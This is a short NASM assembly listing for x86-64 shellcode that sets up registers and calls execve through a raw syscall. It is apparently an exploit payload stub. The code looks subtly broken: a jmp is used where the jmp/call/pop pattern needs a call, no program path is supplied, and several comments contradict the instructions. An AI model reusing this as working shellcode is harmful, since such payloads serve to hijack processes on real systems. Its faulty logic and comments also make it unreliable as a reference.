segment .text
    global _start

_start:
    jmp shellcode

shellcode:

	pop rbx			; rbx = top of stack (should be some addr)
	xor rax, rax		; rax = 0
	mov [rbx+7], al		; null terminate addr
	mov [rbx+8], rbx	; shift addr over to lower 32-bits
	mov [rbx+16], rax	; upper 32-bits = 0

	mov al, 59 			; execve
	lea rdi, [rbx+7]		; filename = 0
	lea rsi, [rbx+8]		; argv = top of stack
	lea rdx, [rbx+16]		; envp = 0

	syscall
